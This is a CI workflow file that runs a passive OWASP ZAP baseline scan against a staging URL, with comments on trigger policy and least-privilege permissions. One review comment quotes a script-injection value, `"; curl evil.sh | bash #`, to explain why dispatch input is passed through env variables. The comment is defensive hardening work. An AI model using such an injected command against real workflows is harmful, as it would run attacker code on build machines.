name: DAST (OWASP ZAP baseline)

# SOC 2 CC7.1 — dynamic application security testing.
# Runs OWASP ZAP baseline scan against a target URL.
#
# ─────────────────────────────────────────────────────────────────────────
# ⚠️ Trigger policy
# ─────────────────────────────────────────────────────────────────────────
# This workflow does NOT run automatically against production. It only runs:
#   1. Manually via workflow_dispatch (Dustin picks the target).
#   2. Weekly on schedule ONLY if `DAST_TARGET_URL` repo variable is set to
#      a non-empty value. Otherwise the scheduled run is a no-op that logs why.
#
# Rationale: ZAP against prod is noisy in customer-facing logs, chews AI budget
# via any AI-backed endpoints, and can trip Cloudflare rate rules. Point it at
# a demo / staging URL (basic-auth'd), not the live prod domain.
#
# To configure:
#   Repo Settings → Variables → New repository variable:
#     Name:  DAST_TARGET_URL
#     Value: https://demo.servicecycle.app (or similar)
#
#   Optionally add secret DAST_AUTH_HEADER holding the basic-auth header value
#   ("Authorization: Basic <base64>") if the target is behind basic auth.

on:
  schedule:
    - cron: '0 8 * * 3'      # Weekly Wed 08:00 UTC
  workflow_dispatch:
    inputs:
      target_url:
        description: 'Target URL (overrides DAST_TARGET_URL var). REQUIRED unless var is set.'
        required: false

permissions:
  contents: read
  security-events: write
  # [2026-07-05 review fix] Removed issues: write -- the ZAP step below sets
  # allow_issue_writing: false (see comment there), so this permission was
  # granted but never exercised. Least-privilege: re-add it in the same
  # commit that flips allow_issue_writing to true, not preemptively.

jobs:
  zap:
    name: OWASP ZAP baseline scan
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - uses: actions/checkout@v4

      - name: Resolve target
        id: target
        # [2026-07-05 review fix] github.event.inputs.target_url is free-text
        # supplied by whoever dispatches this workflow. Interpolating it
        # directly into a `run:` script (as this used to do) is a script-
        # injection vector -- GitHub expands `${{ }}` as raw text BEFORE the
        # shell runs, so a value like `"; curl evil.sh | bash #` would execute.
        # Routing it through `env:` first means the shell sees it as an
        # ordinary variable value, not literal script text.
        env:
          TARGET_URL_INPUT: ${{ github.event.inputs.target_url }}
          DAST_TARGET_URL_VAR: ${{ vars.DAST_TARGET_URL }}
        run: |
          TARGET="$TARGET_URL_INPUT"
          if [ -z "$TARGET" ]; then
            TARGET="$DAST_TARGET_URL_VAR"
          fi
          if [ -z "$TARGET" ]; then
            echo "no-target=true" >> "$GITHUB_OUTPUT"
            echo "::warning::No DAST target configured. Set repo variable DAST_TARGET_URL or supply target_url input. Skipping scan."
            exit 0
          fi
          echo "target=$TARGET" >> "$GITHUB_OUTPUT"
          echo "no-target=false" >> "$GITHUB_OUTPUT"

      - name: Prepare ZAP config
        if: steps.target.outputs.no-target != 'true'
        run: |
          # Rules file lets us tune noise. Example: -1 = ignore, 0 = pass,
          # 1 = warn, 2 = fail. Start with defaults; tighten over time.
          mkdir -p .zap
          cat > .zap/rules.tsv <<'EOF'
          # Format: <rule id>\t<threshold>\t<comment>
          # Example: 10011\tOFF\tCookie without Secure flag — safe on demo behind basic-auth
          EOF

      - name: Run ZAP baseline
        if: steps.target.outputs.no-target != 'true'
        uses: zaproxy/action-baseline@v0.15.0
        with:
          target: ${{ steps.target.outputs.target }}
          rules_file_name: '.zap/rules.tsv'
          # Fail the run on high-risk findings. Baseline is a passive scan —
          # it does not attempt to exploit, so it's safe against auth'd demo.
          cmd_options: '-a -j -T 15'
          # Do not open GitHub issues on findings — we'd rather triage from the
          # workflow artifact. Flip to true if we want automated issue creation.
          allow_issue_writing: false
          # Do not fail the job — collect the artifact so we can triage.
          # We'll gate on findings once the target is stable.
          fail_action: false

      - name: Upload ZAP report
        if: steps.target.outputs.no-target != 'true' && always()
        uses: actions/upload-artifact@v4
        with:
          name: zap-baseline-${{ github.run_number }}
          path: |
            report_md.md
            report_html.html
            report_json.json
          retention-days: 90
